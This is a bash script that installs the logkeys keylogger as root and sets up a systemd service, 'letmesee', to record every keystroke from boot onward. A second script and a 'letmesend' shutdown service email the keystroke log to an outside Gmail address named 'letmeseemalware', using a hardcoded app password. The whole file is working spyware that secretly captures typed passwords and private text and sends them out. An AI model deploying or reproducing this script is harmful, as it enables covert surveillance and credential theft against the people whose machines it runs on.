#!/bin/bash

if [ "$EUID" -ne 0 ]
 	then echo "Run as root!"
	exit
fi

declare -A osInfo;

osInfo[/etc/debian_version]="apt install -y build-essential autotools-dev autoconf kbd postfix"
osInfo[/etc/centos-release]="yum install -y automake make gcc-c++ kbd postfix"
osInfo[/etc/fedora-release]="dnf install -y automake make gcc-c++ kbd"
osInfo[/etc/SuSE-release]="zypper install automake gcc-c++ kbd"
osInfo[/etc/arch-release]="pacman -S base-devel kbd"

for f in ${!osInfo[@]}
do
    if [[ -f $f ]];
    then
        package_manager=${osInfo[$f]}
    fi
done

sudo ${package_manager}

cd /etc
wget https://github.com/kernc/logkeys/archive/master.zip

unzip master.zip

cd logkeys-master

./autogen.sh

cd build

../configure

make

sudo make install

cd ..
cd keymaps

all_lang=$(setxkbmap -query | grep layout | tr -s ' ' | cut -d ' ' -f 2)
lang=$(echo $all_lang | cut -d ',' -f 1)
kmap=$(ls | grep -iF -m 1 $lang)

echo $all_lang >> /var/log/logkeys.log
echo $kmap >> /var/log/logkeys.log

ARG1="--start"
ARG2="--keymap=/etc/logkeys-master/keymaps/en_US_ubuntu_1204.map"

sudo logkeys $ARG1 $ARG2

cat <<EOT > /etc/systemd/system/letmesee.service
[Unit]
Description=I want to see what you are doing
After=default.target

[Service]
Type=forking
EnvironmentFile=/etc/.progconf
ExecStart=/bin/bash /etc/logkeys-master/scripts/logkeys-start.sh \$ARG1 \$ARG2
TimeoutStartSec=0

[Install]
WantedBy=default.target
EOT

chmod 755 /etc/systemd/system/letmesee.service
systemctl daemon-reload
systemctl enable letmesee.service

cat <<EOT > /etc/logkeys-master/scripts/mail-log.sh
#!/bin/bash

sender=letmeseemalware@gmail.com
receiver=letmeseemalware@gmail.com
gapp=psoesoolbgtlbzqv
file=/var/log/logkeys.log

# MIME type for multiple type of input file extensions

MIMEType=\$(file --mime-type "$file" | sed 's/.*: //')
curl -s --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
 --mail-from \$sender \
 --mail-rcpt \$receiver\
 --user \$sender:$gapp \
 -H "Subject: \$sub" -H "From: \$sender" -H "To: \$receiver" -F \
 '=(;type=multipart/mixed' -F "=\$body;type=text/plain" -F \
 "file=@\$file;type=\$MIMEType;encoder=base64" -F '=)'
EOT

chmod 755 /etc/logkeys-master/scripts/mail-log.sh

cat <<EOT > /etc/systemd/system/letmesend.service
[Unit]
Description=I want to send what you are doing
Before=shutdown.target

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/logkeys-master/scripts/mail-log.sh
TimeoutStartSec=0

[Install]
WantedBy=shutdown.target
EOT

chmod 755 /etc/systemd/system/letmesend.service
systemctl daemon-reload
systemctl enable letmesend.service
systemctl start letmesend.service
